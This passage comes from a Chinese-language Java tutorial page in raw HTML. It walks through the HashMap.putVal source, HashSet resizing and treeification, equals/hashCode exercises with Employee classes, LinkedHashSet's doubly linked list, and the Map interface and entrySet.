class="hljs-comment">//进入该项</span><br>        Node&lt;K,V&gt; e; K k; <span class="hljs-comment">//辅助变量</span><br>      <span class="hljs-comment">//开发技巧提示：需要的地方再创建变量</span><br>      <span class="hljs-comment">//判断</span><br>        <span class="hljs-keyword">if</span> (p.hash == hash &amp;&amp;   <br>            ((k = p.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<br>          <span class="hljs-comment">//可能1</span><br>          <span class="hljs-comment">//如果当前索引位置对应的链表的第一个元素和准备添加的key的hash值相同</span><br>          <span class="hljs-comment">//并且，满足下面两个条件之一</span><br>          <span class="hljs-comment">//1.1 准备加入的key和p指向的Node结点的key相同</span><br>          <span class="hljs-comment">//1.2 key不为空，而且，key的equals()和准备加入的key比较后相同</span><br>            e = p;<span class="hljs-comment">//就不能加入</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p <span class="hljs-keyword">instanceof</span> TreeNode)<br>          <span class="hljs-comment">//可能2，p是红黑树</span><br>          <span class="hljs-comment">//使用红黑树的方式添加（putTreeVal），暂时不深入</span><br>            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="hljs-built_in">this</span>, tab, hash, key, value);<br>        <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//可能3（不满足1、2）</span><br>          <span class="hljs-comment">//发现已经是一条链表，循环对比（依次和每个元素相比）</span><br>          <span class="hljs-comment">//3.1如果有相同的，退出循环</span><br>          <span class="hljs-comment">//3.2如果没有相同，加在链表的最后面</span><br>          <span class="hljs-comment">//在元素添加到链表后，立即判断 该链表是否达到8个结点</span><br>          <span class="hljs-comment">//如果达到，调用treeifyBin，对链表进行树化(专成红黑树)</span><br>          <span class="hljs-comment">//* 内部还会继续进行判断，如果table的数组大小&lt;64，会先扩容。如果大于，才进行红黑树。</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">binCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; ; ++binCount) &#123; <span class="hljs-comment">//死循环</span><br>                <span class="hljs-keyword">if</span> ((e = p.next) == <span class="hljs-literal">null</span>) &#123;<br>                    p.next = newNode(hash, key, value, <span class="hljs-literal">null</span>);<span class="hljs-comment">//添加在最后</span><br>                    <span class="hljs-keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="hljs-number">1</span>) <span class="hljs-comment">// -1 for 1st</span><br>                        treeifyBin(tab, hash);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (e.hash == hash &amp;&amp;<br>                    ((k = e.key) == key || (key != <span class="hljs-literal">null</span> &amp;&amp; key.equals(k))))<span class="hljs-comment">//有相同的</span><br>                    <span class="hljs-keyword">break</span>;<br>                p = e;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (e != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// existing mapping for key</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> e.value;<br>            <span class="hljs-keyword">if</span> (!onlyIfAbsent || oldValue == <span class="hljs-literal">null</span>)<br>                e.value = value;<br>            afterNodeAccess(e);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br>    ++modCount;<br>    <span class="hljs-keyword">if</span> (++size &gt; threshold)<br>        resize();<br>    afterNodeInsertion(evict);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="HashSet扩容和转成红黑树机制"><a href="#HashSet扩容和转成红黑树机制" class="headerlink" title="HashSet扩容和转成红黑树机制"></a>HashSet扩容和转成红黑树机制</h4><p><strong>⭐️结论</strong></p><ol><li>HashSet底层是HashMap，第一次添加时，table 数组扩容到16，临界值<br>（threshold）是16＊加载因子（loadFactor）是0.75 ＝ 12</li><li>如果table 数组使用到了临界值12，就会扩容到16＊2＝32，新的临界值就是32＊0.75＝24，依次类推</li><li>在Java8中，如果一条链表的元素个数到 达 TREEIFY THRESHOLD（默认是8），并且table的大小＞＝IMIN_TREEIFY_CAPACITY（默认64），就会进行树化（红黑树），<strong>否则仍然采用数组扩容机制</strong></li></ol><p>注意：size指的是整个Node里的元素个数</p><h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><blockquote><p>定义一个Employee类，该类包含：private成员属性name，age 要求：</p><p>1.创建3个Employee 放入 HashSet中</p><p>2.当name和age的值相同时，认为是相同员工，不能添加到HashSet集合中</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        定义一个Employee类，该类包含：private成员属性name，age 要求：</span><br><span class="hljs-comment">//        1.创建3个Employee 放入 HashSet中</span><br><span class="hljs-comment">//        2.当name和age的值相同时，认为是相同员工，不能添加到HashSet集合中</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">21</span>));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;pat&quot;</span>,<span class="hljs-number">23</span>));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;tim&quot;</span>,<span class="hljs-number">22</span>));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;tim&quot;</span>,<span class="hljs-number">22</span>));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;tim&quot;</span>,<span class="hljs-number">22</span>));<br><br>        <span class="hljs-keyword">for</span> (Object o :hashSet) &#123;<br>            System.out.println(o);<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//如果name和age值相同，则认为是相同的（重写equals和hashCode）</span><br>  <span class="hljs-comment">//可用快捷键生成</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span> || getClass() != o.getClass()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Employee</span> <span class="hljs-variable">employee</span> <span class="hljs-operator">=</span> (Employee) o;<br>        <span class="hljs-keyword">return</span> getAge() == employee.getAge() &amp;&amp; Objects.equals(getName(), employee.getName());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Objects.hash(getName(), getAge());<br>    &#125;<br></code></pre></td></tr></table></figure><p>输出：</p><p>Employee{name&#x3D;’pat’, age&#x3D;23}<br>Employee{name&#x3D;’jack’, age&#x3D;21}<br>Employee{name&#x3D;’tim’, age&#x3D;22}</p><h3 id="练习2-1"><a href="#练习2-1" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>定义一个Employee类，该类包含：private成员属性name，sal，birthday（MyDate类 型），其中birthday为MyDate类型（属性包括：year， month，day），要求：<br>1．创建3个Employee 放入 HashSet中<br>2．当name和birthday的值相同时，认为是相同员工，不能添加到HashSet集合中</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        定义一个Employee类，该类包含：private成员属性name，sal，birthday（MyDate类型）</span><br><span class="hljs-comment">//        其中birthday为MyDate类型（属性包括：year， month，day），要求：</span><br><span class="hljs-comment">//        1．创建3个Employee 放入 HashSet中</span><br><span class="hljs-comment">//        2．当name和birthday的值相同时，认为是相同员工，不能添加到HashSet集合中</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">hashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee2</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">2000</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">2000</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee2</span>(<span class="hljs-string">&quot;pat&quot;</span>, <span class="hljs-number">3050</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">2002</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee2</span>(<span class="hljs-string">&quot;john&quot;</span>, <span class="hljs-number">4000</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">2000</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>)));<br>        hashSet.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee2</span>(<span class="hljs-string">&quot;john&quot;</span>, <span class="hljs-number">4000</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">2000</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>)));<br>        <span class="hljs-keyword">for</span> (Object o : hashSet) &#123;<br>            System.out.println(o);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee2</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sal;<br>    <span class="hljs-keyword">private</span> MyDate birthday;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span> || getClass() != o.getClass()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Employee2</span> <span class="hljs-variable">employee2</span> <span class="hljs-operator">=</span> (Employee2) o;<br>        <span class="hljs-keyword">return</span> Objects.equals(getName(), employee2.getName()) &amp;&amp; Objects.equals(getBirthday(), employee2.getBirthday());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Objects.hash(getName(), getBirthday());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Employee&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, sal=&quot;</span> + sal +<br>                <span class="hljs-string">&quot;, birthday=&quot;</span> + birthday +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee2</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> sal, MyDate birthday)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sal = sal;<br>        <span class="hljs-built_in">this</span>.birthday = birthday;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSal</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sal;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSal</span><span class="hljs-params">(<span class="hljs-type">double</span> sal)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sal = sal;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> MyDate <span class="hljs-title function_">getBirthday</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> birthday;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBirthday</span><span class="hljs-params">(MyDate birthday)</span> &#123;<br>        <span class="hljs-built_in">this</span>.birthday = birthday;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDate</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> year;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> month;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> day;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span> || getClass() != o.getClass()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">MyDate</span> <span class="hljs-variable">myDate</span> <span class="hljs-operator">=</span> (MyDate) o;<br>        <span class="hljs-keyword">return</span> getYear() == myDate.getYear() &amp;&amp; getMonth() == myDate.getMonth() &amp;&amp; getDay() == myDate.getDay();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Objects.hash(getYear(), getMonth(), getDay());<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> year + <span class="hljs-string">&quot;-&quot;</span> + month + <span class="hljs-string">&quot;-&quot;</span> + day;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getYear</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> year;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setYear</span><span class="hljs-params">(<span class="hljs-type">int</span> year)</span> &#123;<br>        <span class="hljs-built_in">this</span>.year = year;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMonth</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> month;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMonth</span><span class="hljs-params">(<span class="hljs-type">int</span> month)</span> &#123;<br>        <span class="hljs-built_in">this</span>.month = month;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDay</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> day;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDay</span><span class="hljs-params">(<span class="hljs-type">int</span> day)</span> &#123;<br>        <span class="hljs-built_in">this</span>.day = day;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyDate</span><span class="hljs-params">(<span class="hljs-type">int</span> year, <span class="hljs-type">int</span> month, <span class="hljs-type">int</span> day)</span> &#123;<br>        <span class="hljs-built_in">this</span>.year = year;<br>        <span class="hljs-built_in">this</span>.month = month;<br>        <span class="hljs-built_in">this</span>.day = day;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-LinkedHashSet"><a href="#9-LinkedHashSet" class="headerlink" title="9.LinkedHashSet"></a>9.LinkedHashSet</h2><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230304094503016.png" alt="image-20230304094503016" style="zoom:50%;" /><h3 id="基本介绍-3"><a href="#基本介绍-3" class="headerlink" title="基本介绍"></a>基本介绍</h3><ol><li>LinkedHashSet是<strong>HashSet的子类</strong></li><li>LinkedHashSet 底层是一个LinkedHashMap，底层维护了一个<strong>数组＋双向链表</strong></li><li>LinkedHashSet 根据元素的 hashCode 值来决定元素的存储位置，同时使用链表维护元素的次序，这使得元素看起来是以插入顺序保存的。</li><li>LinkedHashSet 不允许添重复元素</li></ol><h3 id="底层机制"><a href="#底层机制" class="headerlink" title="底层机制"></a>底层机制</h3><p><strong>说明：</strong></p><ol><li><p>在LinkedHastSet 中维护了一个<strong>hash表和双向链表</strong> （LinkedHashSet有<strong>head</strong>和 <strong>tail</strong>）</p></li><li><p>每一个节点有pre和next属性，这样可以形成双向链表3）</p></li><li><p>在添加一个元素时，先求hash值，再求索引．，确定该元素在hashtable的位置，然后将添加的元素加入到双向链表（如果已经存在，不添加［原则和hashset一样］）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">tail.next ＝ newElement<span class="hljs-comment">//简单指定</span><br>newElement.pre =<span class="hljs-type">tail</span><br><span class="hljs-variable">tail</span> <span class="hljs-operator">=</span>newEelment；<br></code></pre></td></tr></table></figure></li><li><p>这样的话，我们遍历LinkedHashSet也能确保<strong>插入顺序和遍历顺序一致</strong></p></li></ol><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Set</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>(); <span class="hljs-comment">//①</span><br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;AA&quot;</span>)); <span class="hljs-comment">//②</span><br>set.add(<span class="hljs-number">456</span>); <span class="hljs-comment">//③</span><br>set.add(<span class="hljs-number">456</span>); <span class="hljs-comment">//④</span><br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(<span class="hljs-string">&quot;刘&quot;</span>,<span class="hljs-number">1001</span>));<br>set.add(<span class="hljs-number">123</span>);<br>set.add(<span class="hljs-string">&quot;HSP&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;set=&quot;</span>+set);<br></code></pre></td></tr></table></figure><p>①看debug可知，LinkedHashSet底层维护的是LinkedHashMap（HashMap的子类）</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230304100604329.png" alt="image-20230304100604329" style="zoom:50%;" /><p>②第一次添加，直接将 数组table扩容到16，存放的节点类型是<strong>LinkedHashMap$Entry</strong><br><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230304102751204.png" alt="image-20230304102751204" style="zoom:50%;" /></p><p>数组是 <strong>HashMap$Node[]</strong> 存放的元素&#x2F;数据时 <strong>LinkedHashMap$Entry</strong> 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Entry 继承了 HashMap  //该继承关系是在内部类完成</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entry</span>&lt;K,V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HashMap</span>.Node&lt;K,V&gt; &#123;<br>    Entry&lt;K,V&gt; before, after;<br>    Entry(<span class="hljs-type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;<br>        <span class="hljs-built_in">super</span>(hash, key, value, next);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>③第二次添加，456before指向AA，AA的after指向456.</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230304103408044.png" alt="image-20230304103408044" style="zoom:50%;" /><p>​map的head指向AA，tail指向456.</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230304103824737.png" alt="image-20230304103824737" style="zoom:50%;" /><p>④添加重复数据，实际上HashSet没有区别，一样调用map.put()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">return</span> map.put(e, PRESENT)==<span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-Map接口"><a href="#10-Map接口" class="headerlink" title="10.Map接口"></a>10.Map接口</h2><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230227180716337.png" alt="image-20230227180716337"></p><p>set的key为输进去的对象，value为PRESENT（常量）。</p><p>map则不同。</p><h3 id="JDK8的MAP特点"><a href="#JDK8的MAP特点" class="headerlink" title="JDK8的MAP特点"></a>JDK8的MAP特点</h3><ol><li><p>Map与Collection并列存在。用于<strong>保存具有映射关系</strong>的数据：<strong>Key-Value</strong>（双列元素）</p></li><li><p>Map中的key和 value 可以是任何引用类型的数据，会封装到HashMap＄Node</p><p>对象中</p></li><li><p>Map中的<strong>key不允许重复</strong>（原因和HashSet 一样，前面分析过源码）</p><p>当有相同的key，等价于替换（新替旧）。</p></li><li><p>Map中的<strong>value 可以重复</strong></p></li><li><p>Map的key <strong>可以为 null，但只能有一个</strong>；value 可以为null，可以有多个.</p></li><li><p>常用String类作为Map的 key （其他的类型也可以）</p></li><li><p>key 和 value 之间存在单向一对一关系，即通过指定的key 总能找到对应的 value</p></li><li><p>Map存放数据的key-value示意图，一对 k-v是放在一个Node中的。</p><p>又因为Node 实现了 Entry 接口，有些书上也说 一对k-v就是一个Entry。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&lt;K,V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry&lt;K,V&gt; &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> hash;<br>    <span class="hljs-keyword">final</span> K key;<br>    V value;<br>    Node&lt;K,V&gt; next;<br><br>    Node(<span class="hljs-type">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;<br>        <span class="hljs-built_in">this</span>.hash = hash;<br>        <span class="hljs-built_in">this</span>.key = key;<br>        <span class="hljs-built_in">this</span>.value = value;<br>        <span class="hljs-built_in">this</span>.next = next;<br>    &#125;<br></code></pre></td></tr></table></figure><ol><li><p>k-v 最后是 HashMap＄Node node ＝ newNode（hash， key， value， null）</p></li><li><p>k-v 为了方便程序员的遍历，还会 创建 EntrySet 集合，该集合存放的元素的类型 Entry，而一个Entry对象就有k，v  EntrySet＜Entry＜K,V＞＞ </p><p>即： transient Set＜Map.Entry＜K,V＞＞ entrySet；</p></li><li><p>entrySet 中，定义的类型是 Map.Entry，但是实际上存放的还是 HashMap＄Node</p><blockquote><p><em>entrySet() 方法返回映射中包含的映射的 Set 视图</em></p></blockquote></li><li><p>当把HashMap$Node 对象存放到entrySet 就方便我们遍历。因为Map.Entry提供了重要方法：K getKey();  V getValue();</p></li></ol></li></ol><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230305120023477.png" alt="image-20230305120023477" style="zoom:50%;" /><p>案例(1-7)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 